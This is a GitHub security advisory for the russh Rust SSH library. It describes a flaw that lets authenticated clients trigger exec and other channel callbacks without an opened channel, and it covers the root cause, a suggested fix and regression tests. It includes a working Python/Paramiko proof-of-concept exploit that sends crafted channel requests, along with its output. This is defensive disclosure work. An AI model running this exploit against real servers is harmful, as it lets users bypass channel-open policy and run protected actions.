# [M] Russh: Channel-scoped server callbacks can be reached without an open channel

## Summary
Severity: Medium
Advisory: GHSA-m65r-rprj-r5rg
CVE: CVE-2026-68930
CWE: CWE-666, CWE-696, CWE-863
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-08-03
Source: https://github.com/advisories/GHSA-m65r-rprj-r5rg
Type: github-advisory

## Affected
- crates.io: `russh` — affected >=0 <0.62.5

## Details
There is a server-side channel state issue in `russh`.

After a client is authenticated, `russh` can dispatch channel-scoped handler callbacks for recipient channel IDs that were never opened or confirmed. In the strongest reproduced case, the client does not send `SSH_MSG_CHANNEL_OPEN` at all. It authenticates normally, then sends `SSH_MSG_CHANNEL_REQUEST` packets with request type `exec` for a range of recipient channel IDs. `russh` still calls the server application's `exec_request` handler.

This is not an authentication bypass. A valid login is required. The issue is that the SSH channel lifecycle is not enforced before channel-scoped callbacks are delivered to the application.

## Impact

An authenticated client can bypass the server application's channel-open policy.

A server may deny session channels by returning `false` from `Handler::channel_open_session`. A server may also assume that callbacks such as `exec_request`, `shell_request`, `subsystem_request`, `data`, `channel_eof`, or `channel_close` are only delivered for channels that were opened and confirmed by the SSH transport layer.

That assumption does not hold in the vulnerable path. A malicious authenticated peer can send channel-scoped messages for arbitrary recipient channel IDs and cause handler callbacks to run even though no channel exists.

The exact impact depends on the downstream application. For many SSH server use cases, `exec_request`, `shell_request`, or `subsystem_request` start commands, jobs, shells, SFTP-like subsystems, internal workflows, or other state-changing operations. In the PoC, the protected `exec_request` action runs even though no channel was opened.

## Why this is not intended behavior

SSH channel requests are not global post-authentication requests. They are operations on an existing channel.

RFC 4254 describes channel-specific messages as carrying a recipient channel number. The `exec` request is a `SSH_MSG_CHANNEL_REQUEST` for a session channel. That means the recipient channel should refer to a channel that exists in the local open-channel state.

The relevant boundary is therefore not password authentication. The boundary is the channel-open decision. If no channel has been opened, or if the application denied the open request, `russh` should not deliver session-specific callbacks for that recipient ID.

This is also not just a handler bug. The handler does not own the transport channel table. `russh` does. The application gets a `channel_open_*` callback and returns whether the channel is allowed. If that decision is denied, or if the client never requested a channel at all, channel-scoped callbacks should not be reachable.

## Documentation and API boundary

The public API documentation supports this boundary.

`channel_open_session` is the application hook for creating a new session channel, and its boolean return value is the application's decision on whether that channel open should be granted. Separately, `exec_request` is the application hook for deciding what to do with a command request received on a channel.

Those are different responsibilities. The application can decide whether a command is allowed. The library must first decide whether the recipient channel exists and was actually opened.

Delivering `exec_request` for a recipient `ChannelId` that is absent from the established channel table bypasses the channel-open decision before the application can safely rely on it.

## Root cause

In `server_read_authenticated` in `russh/src/server/encrypted.rs`, channel-scoped messages are decoded and then dispatched to handler callbacks without a mandatory check that the recipient channel is established in the encrypted session's channel table.

The problematic pattern is visible in the `CHANNEL_REQUEST` handling. The code reads the recipient channel ID and request fields. It may look up the channel to send an internal `ChannelMsg` into the stream API, but the handler callback is outside that guard.

For example, the `exec` branch has this shape:

```rust
"exec" => {
    let req = map_err!(Bytes::decode(r))?;
    map_err!(ensure_end(r))?;

    if let Some(chan) = self.channels.get(&channel_num) {
        let _ = chan
            .send(ChannelMsg::Exec {
                want_reply: true,
                command: req.to_vec(),
            })
            .await;
    }

    handler.exec_request(channel_num, &req, self).await
}
```

If `channel_num` is not open, the internal send is skipped, but `handler.exec_request(...)` is still called.

The same issue applies to other channel-scoped callbacks such as `shell_request`, `subsystem_request`, `env_request`, `pty_request`, `data`, `extended_data`, `channel_eof`, and `channel_close`.

There is a second related problem in `server_handle_channel_open`. The application-side channel reference can be inserted into `self.channels` even when the handler returns `Ok(false)`. The protocol table `enc.channels` is only populated when the open is actually allowed. This means the two maps can diverge after a denied open.

The authoritative source for whether a channel is established should be `enc.channels`, not `self.channels`.

## Evidence from the PoC

The PoC uses a real `russh` server over localhost TCP. It uses real authentication with username `alice` and password `correct`. Paramiko is used only as an authenticated SSH peer that can send crafted packets over the real encrypted SSH transport.

POC Code :

```python
import argparse
import sys
import time

import paramiko
from paramiko.common import MSG_CHANNEL_REQUEST, cMSG_CHANNEL_REQUEST
from paramiko.message import Message
from paramiko.ssh_exception import ChannelException

CHANNEL_SCAN_END = 32


def connect(port: int) -> paramiko.Transport:
    transport = paramiko.Transport(("127.0.0.1", port))
    transport.connect(username="alice", password="correct")
    return transport


def normal_allowed(port: int) -> None:
    transport = connect(port)
    print("normal client: CHANNEL_OPEN session")
    channel = transport.open_session(timeout=5)
    print("normal client: session open confirmed")
    print('normal client: exec "protected"')
    channel.exec_command("protected")
    time.sleep(0.25)
    channel.close()
    transport.close()


def normal_denied(port: int) -> None:
    transport = connect(port)
    print("normal client: CHANNEL_OPEN session")
    try:
        transport.open_session(timeout=5)
    except ChannelException:
        print("normal client: session open denied")
        pass
    else:
        raise RuntimeError("normal denied control unexpectedly opened a session channel")
    time.sleep(0.25)
    transport.close()


def send_exec_request(transport: paramiko.Transport, recipient_channel: int) -> None:
    print(
        "crafted packet: "
        f"SSH_MSG_CHANNEL_REQUEST({MSG_CHANNEL_REQUEST}) "
        f"recipient_channel={recipient_channel} "
        'request_type="exec" '
        'command="protected"'
    )
    msg = Message()
    msg.add_byte(cMSG_CHANNEL_REQUEST)
    msg.add_int(recipient_channel)
    msg.add_string("exec")
    msg.add_boolean(True)
    msg.add_string(b"protected")
    transport._send_user_message(msg)


def exploit_denied(port: int) -> None:
    transport = connect(port)
    print("malicious peer: CHANNEL_OPEN session")
    try:
        transport.open_session(timeout=5)
    except ChannelException:
        print("malicious peer: session open denied")
    else:
        raise RuntimeError("exploit setup unexpectedly opened a session channel")

    print(f"malicious peer: scanning recipient channel ids 0..{CHANNEL_SCAN_END - 1}")
    for channel_id in range(CHANNEL_SCAN_END):
        send_exec_request(transport, channel_id)
        time.sleep(0.01)
    time.sleep(0.5)
    transport.close()


def exploit_without_open(port: int) -> None:
    transport = connect(port)
    print("malicious peer: no CHANNEL_OPEN sent")
    print(f"malicious peer: scanning recipient channel ids 0..{CHANNEL_SCAN_END - 1}")
    for channel_id in range(CHANNEL_SCAN_END):
        send_exec_request(transport, channel_id)
        time.sleep(0.01)
    time.sleep(0.5)
    transport.close()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--mode",
        choices=["allowed", "denied", "denied-open", "noopen"],
        required=True,
    )
    parser.add_argument("--port", type=int, required=True)
    args = parser.parse_args()

    if args.mode == "allowed":
        normal_allowed(args.port)
    elif args.mode == "denied":
        normal_denied(args.port)
    elif args.mode == "noopen":
        exploit_without_open(args.port)
    else:
        exploit_denied(args.port)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

The crafted packet form is:

```text
SSH_MSG_CHANNEL_REQUEST(98)
recipient_channel = N
request_type = "exec"
command = "protected"
```

The PoC runs normal controls and exploit cases in one execution.

### Allowed control

This proves the protected action works normally when a session channel is opened.

```text
normal client: CHANNEL_OPEN session
normal client: session open confirmed
normal client: exec "protected"

channel_open_session called: 1
exec_request called: 1
protected action executed: 1
channel ever opened/confirmed: true
working recipient channel ids: [2]
```

### Denied control

This proves the application policy denies session channels and a normal client cannot reach the protected action.

```text
normal client: CHANNEL_OPEN session
normal client: session open denied

channel_open_session called: 1
exec_request called: 0
protected action executed: 0
channel ever opened/confirmed: false
working recipient channel ids: none
```

### Main exploit: no channel open

This is the main issue.

The authenticated client does not send `SSH_MSG_CHANNEL_OPEN`. It sends crafted `SSH_MSG_CHANNEL_REQUEST` packets for recipient IDs `0..31`.

```text
malicious peer: no CHANNEL_OPEN sent
malicious peer: scanning recipient channel ids 0..31

channel_open_session called: 0
exec_request called: 32
protected action executed: 32
channel ever opened/confirmed: false
working recipient channel ids: [0, 1, 2, ..., 31]
```

This removes the "guessed channel ID" concern. Every scanned recipient ID reached the protected action in the vulnerable run.

### Additional variant: denied open

The client asks for a session channel, the handler denies it, and the client then sends the same crafted requests.

```text
malicious peer: CHANNEL_OPEN session
malicious peer: session open denied

channel_open_session called: 1
exec_request called: 32
protected action executed: 32
channel ever opened/confirmed: false
working recipient channel ids: [0, 1, 2, ..., 31]
```

The denied-open variant is not required for exploitability, but it shows the same state validation gap after an explicit application denial.

## Affected code path

Verified at:

```text
f1a0f180a02ccedf48d86f2c5e0361308cf6b7c6
v0.61.1-9-gf1a0f18
```

The affected logic is in:

```text
russh/src/server/encrypted.rs
```

The vulnerable area is:

```text
server_read_authenticated
```

Channel request dispatch decodes a recipient channel ID and calls request-specific handler callbacks without first requiring that the recipient ID exists as a confirmed channel in `enc.channels`.

The affected request callbacks include:

```text
pty_request
x11_request
env_request
shell_request
agent_request
exec_request
subsystem_request
window_change_request
signal
```

The same missing established-channel guard affects:

```text
CHANNEL_DATA
CHANNEL_EXTENDED_DATA
CHANNEL_EOF
CHANNEL_CLOSE
```

A related issue exists in:

```text
server_handle_channel_open
```
Application channel references should not be retained for denied opens.

## Why this belongs in russh

The application cannot reliably enforce the SSH transport channel lifecycle from inside individual callbacks. By the time `exec_request` is called, the application is already being told that a channel-scoped request exists. The library should not call that handler for a channel ID that does not exist in the confirmed channel table.

This is the same kind of invariant `russh` already applies for some channel state updates. The missing part is to apply the established-channel check consistently before all channel-scoped callbacks are dispatched.

The safe expectation is simple:

```text
No established channel, no channel-scoped handler callback.
```

## Suggested fix

Before dispatching any channel-scoped callback, require the recipient `ChannelId` to exist in the encrypted session's established channel table and to be confirmed.

The authoritative check should use `enc.channels`, not `self.channels`.

A minimal approach is to add a helper like:

```rust
fn ensure_established_channel(&self, channel: ChannelId) -> Result<(), Error> {
    if self
        .common
        .encrypted
        .as_ref()
        .and_then(|enc| enc.channels.get(&channel))
        .is_some_and(|channel| channel.confirmed)
    {
        Ok(())
    } else {
        Err(Error::Inconsistent)
    }
}
```

Then call it before dispatching channel-scoped callbacks for:

```text
CHANNEL_REQUEST
CHANNEL_DATA
CHANNEL_EXTENDED_DATA
CHANNEL_EOF
CHANNEL_CLOSE
CHANNEL_WINDOW_ADJUST
```

For unknown or unconfirmed channels, `russh` should not call application callbacks. The exact wire response can be request failure, ignore, or disconnect depending on the existing protocol-error handling for that message type.

The channel-open path should also retain application-side channel references only when the open is approved:

```rust
let mut result = handler.channel_open_session(channel, self).await;

if let Ok(allowed) = &mut result {
    if *allowed {
        self.channels.insert(sender_channel, reference);
    }

    self.finalize_channel_open(&msg, channel_params, *allowed)?;
}
```

## Regression coverage

A regression test should authenticate normally, then verify that callbacks are not reached in these cases:

```text
1. CHANNEL_REQUEST "exec" without prior CHANNEL_OPEN
2. CHANNEL_OPEN "session" denied by the handler, then CHANNEL_REQUEST "exec"
3. CHANNEL_DATA without prior CHANNEL_OPEN
4. CHANNEL_EOF / CHANNEL_CLOSE without prior CHANNEL_OPEN
```

The test should fail if any channel-scoped callback such as `exec_request`, `shell_request`, `subsystem_request`, `data`, `channel_eof`, or `channel_close` is invoked for a non-established channel.

A positive control should confirm that a normally opened session channel still reaches the expected callbacks.

In the local validation, the targeted regression passed after the patch:

```text
cargo test -p russh --test channel_state_validation
```

The full workspace also passed:

```text
cargo test --workspace
```
## Duplicate check

I checked existing `Eugeny/russh` advisories and issue searches for terms related to:

```text
CHANNEL_REQUEST
exec_request
channel_open_session denied
unopened channel
server_handle_channel_open
channel request handler
```

Existing advisories cover unrelated authentication, parser, allocation, window-adjust, Terrapin, and cryptographic issues. I did not find an existing advisory or issue for channel-scoped callbacks being dispatched for unopened or denied recipient channel IDs.

## References
- https://github.com/Eugeny/russh/security/advisories/GHSA-m65r-rprj-r5rg
- https://github.com/Eugeny/russh/commit/7c5659f8cf6f6f2f9989d12dba0ebf49dc50a171
- https://github.com/Eugeny/russh
- https://github.com/Eugeny/russh/releases/tag/v0.62.5
